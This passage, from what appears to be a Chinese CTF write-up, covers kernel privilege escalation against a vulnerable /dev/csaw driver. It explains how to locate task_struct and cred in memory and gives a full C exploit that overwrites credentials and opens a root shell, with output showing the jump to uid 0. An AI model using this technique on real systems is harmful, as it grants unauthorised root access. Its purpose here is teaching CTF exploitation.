class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> = <span class="title">current</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">validate_process_creds();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">"prepare_creds() alloc %p"</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">old = task-&gt;cred;</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line"></span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;session_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;process_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;thread_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_creds);</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这种漏洞利用方法非常简单粗暴，即利用内存任意读找到cred结构体，再利用内存任意写，将用于表示权限的数据位写为0，就可以完成提权。</p><p>那如何找到这个结构体呢？在task_struct里有一个    char comm[TASK_COMM_LEN]; 结构，而这个结构可以通过prctl函数中的PR_SET_NAME功能，设置为一个小于16字节的字符串。<a href="http://man7.org/linux/man-pages/man2/prctl.2.html" target="_blank" rel="noopener">文档</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_NAME (since Linux 2.6.9)</span><br><span class="line">       Set the name of the calling thread, using the value in the</span><br><span class="line">       location pointed to by (char *) arg2.  The name can be up to</span><br><span class="line">       16 bytes long, including the terminating null byte.  (If the</span><br><span class="line">       length of the string, including the terminating null byte,</span><br><span class="line">       exceeds 16 bytes, the string is silently truncated.)  This is</span><br><span class="line">       the same attribute that can be set via pthread_setname_np(3)</span><br><span class="line">       and retrieved using pthread_getname_np(3).  The attribute is</span><br><span class="line">       likewise accessible via /proc/self/task/[tid]/comm, where tid</span><br><span class="line">       is the name of the calling thread.</span><br></pre></td></tr></table></figure><p>而通过设定这个值，并利用内存任意读即可找到这个预设的字符串，即可找到task_structure结构体，进一步找到cred结构体，就可以利用内存任意写来提权了。</p><p>还有一个问题是，爆破的范围如何确定？这涉及到了如何得到一个task_struct，同样是kmem_cache_alloc_node，因此task_struct应该存在内核的动态分配区域。<br>(\kernel\fork.c 140)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct task_struct *<span class="title">alloc_task_struct_node</span><span class="params">(<span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> kmem_cache_alloc_node(task_struct_cachep, GFP_KERNEL, node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据内存映射图，爆破范围应该在0xffff880000000000~0xffffc80000000000</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffffff  ---+-----------+-----------------------------------------------+-------------+</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    8M                 |           | unused hole                                   |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffff7ff000  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|</span><br><span class="line">    1M                 |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffff600000  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|</span><br><span class="line">    548K               |           | vsyscalls                                     |+++++++++++++|</span><br><span class="line">0xffffffffff577000  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|</span><br><span class="line">    5M                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffffffff000000  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    1520M              |           | module mapping space (MODULES_LEN)            |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    512M               |           | kernel text mapping, from phys 0              |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|</span><br><span class="line">    2G                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    64G                |           | EFI region mapping space                      |+++++++++++++|</span><br><span class="line">0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    444G               |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    16T                |           | %esp fixup stacks                             |+++++++++++++|</span><br><span class="line">0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    3T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    16T                |           | kasan shadow memory (16TB)                    |+++++++++++++|</span><br><span class="line">0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|</span><br><span class="line">    1T                 |           | virtual memory map for all of struct pages    |+++++++++++++|</span><br><span class="line">0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|</span><br><span class="line">    32T                |           | vmalloc/ioremap (1 &lt;&lt; VMALLOC_SIZE_TB)        |+++++++++++++|</span><br><span class="line">0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    64T                |           | direct mapping of all phys. memory            |+++++++++++++|</span><br><span class="line">                       |           | (1 &lt;&lt; MAX_PHYSMEM_BITS)                       |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    8T                 |           | guard hole, reserved for hypervisor           |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+</span><br><span class="line">                       |-----------|                                               |-------------|</span><br><span class="line">                       |-----------| hole caused by [48:63] sign extension         |-------------|</span><br><span class="line">                       |-----------|                                               |-------------|</span><br><span class="line">0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+</span><br><span class="line">    PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|</span><br><span class="line">0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |  user space |</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">    128T               |           | different per mm                              |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+</span><br></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>最终EXP及运行结果如下：</p><p><strong>pwn_task_struct.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i ;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;((len/<span class="number">8</span>)*<span class="number">8</span>);i+=<span class="number">8</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%lx"</span>,*(<span class="keyword">size_t</span> *)(buf+i) );</span><br><span class="line"><span class="keyword">if</span> (i%<span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffff880000000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr ;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"><span class="comment">//set target in task_struct</span></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target,<span class="string">"try2findmep4nda"</span>);</span><br><span class="line">prctl(PR_SET_NAME , target);</span><br><span class="line">fd = open(<span class="string">"/dev/csaw"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] alloc_channel error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] now we get a channel %d\n"</span>,alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span>+<span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] we can read and write any momery"</span>);</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = addr<span class="number">-0x10</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd,CSAW_READ_CHANNEL,&amp;read_args);</span><br><span class="line">result = memmem(buf,<span class="number">0x1000</span>,target,<span class="number">16</span>);</span><br><span class="line"><span class="comment">//printf("0x%lx",addr);</span></span><br><span class="line"><span class="keyword">if</span> (result)</span><br><span class="line">&#123;</span><br><span class="line">cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x8</span>);</span><br><span class="line">real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">if</span>( (cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))&#123;</span><br><span class="line"><span class="comment">//printf("[]%lx[]",result-(int)(buf));</span></span><br><span class="line">target_addr = addr + result-(<span class="keyword">int</span>)(buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]found task_struct 0x%lx\n"</span>,target_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]found cred 0x%lx\n"</span>,real_cred);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(result == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"not found , try again "</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;<span class="number">44</span>;i++)&#123;</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = cred<span class="number">-0x10</span> +<span class="number">4</span> + i ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">root_cred[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = (<span class="keyword">char</span> *)root_cred;</span><br><span class="line">write_args.count = <span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]now you are r00t,enjoy ur shell\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] there must be something error ... "</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(chal) gid=1000(chal) groups=1000(chal)</span><br><span class="line">/ $ ./pwn_task_struct</span><br><span class="line">[+] now we get a channel 1</span><br><span class="line">[+] we can <span class="built_in">read</span> and write any momery</span><br><span class="line">[+]found task_struct 0xffff880007f8c800</span><br><span class="line">[+]found cred 0xffff88000f946180</span><br><span class="line">[+]now you are r00t,enjoy ur shell</span><br><span class="line">/ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(chal)</span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="2-劫持VDSO"><a href="#2-劫持VDSO" class="headerlink" title="2 劫持VDSO"></a>2 